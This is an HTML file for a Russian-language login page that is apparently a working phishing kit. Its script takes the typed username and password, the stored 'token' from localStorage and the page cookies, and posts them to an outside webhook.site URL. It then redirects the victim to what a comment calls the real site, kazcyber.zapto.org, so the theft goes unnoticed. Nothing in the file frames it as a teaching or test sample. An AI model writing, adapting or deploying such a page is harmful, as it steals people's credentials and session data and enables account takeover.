<!-- index.html -->
<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <title>Вход в систему</title>
</head>
<body>
  <h1>Авторизация</h1>
  <form id="loginForm">
    <input type="text" id="username" placeholder="Логин"><br>
    <input type="password" id="password" placeholder="Пароль"><br>
    <button type="submit">Войти</button>
  </form>

  <script>
    document.getElementById("loginForm").addEventListener("submit", function(e) {
      e.preventDefault();

      const username = document.getElementById("username").value;
      const password = document.getElementById("password").value;
      const token = localStorage.getItem("token");
      const cookies = document.cookie;

      fetch("https://webhook.site/0f4c8d60-30f6-4dc3-a2ac-3dc4659012fe", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          username: username,
          password: password,
          token: token,
          cookies: cookies
        })
      });

      // Редирект на реальный сайт
      window.location.href = "https://kazcyber.zapto.org/";
    });
  </script>
</body>
</html>
